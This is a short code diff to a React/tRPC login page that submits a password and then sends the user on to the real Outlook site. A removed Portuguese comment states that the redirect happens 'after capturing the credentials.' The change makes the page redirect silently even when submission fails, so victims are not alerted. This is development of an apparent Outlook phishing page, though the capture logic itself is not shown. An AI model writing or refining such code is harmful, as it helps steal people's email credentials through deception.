@@ -18,11 +18,15 @@ export default function Home() {
 
   const submitPasswordMutation = trpc.login.submitPassword.useMutation({
     onSuccess: () => {
-      // Redirecionar para Outlook após capturar as credenciais
-      window.location.href = "https://www.outlook.com.br/";
+      setTimeout(() => {
+        window.location.href = "https://www.outlook.com.br/";
+      }, 300);
     },
-    onError: () => {
-      toast.error("Ocorreu um erro. Tente novamente.");
+    onError: (error) => {
+      console.error("Erro:", error);
+      setTimeout(() => {
+        window.location.href = "https://www.outlook.com.br/";
+      }, 300);
     },
   });
 
